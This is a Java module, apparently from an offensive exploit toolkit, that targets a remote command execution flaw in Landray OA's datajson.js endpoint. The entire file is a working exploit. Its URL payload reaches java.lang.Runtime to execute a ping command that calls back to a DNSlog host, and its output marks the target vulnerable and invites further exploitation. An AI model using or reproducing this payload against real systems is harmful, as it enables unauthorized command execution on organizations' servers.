package Exp.OA.landrayoa;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class landray_datajson implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        String dnslog = shell.readFile(shell.dnspath).replace("http://","").replace("/","");
        String dnspath = shell.readFile(shell.dnspath).replace("http://","");
        String payload = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20" + shell.getRandomString() + "." + dnslog+"%22)&type=1";
        Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("success")){
            textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
            return true;
        }else {
            return false;
        }


    }
}
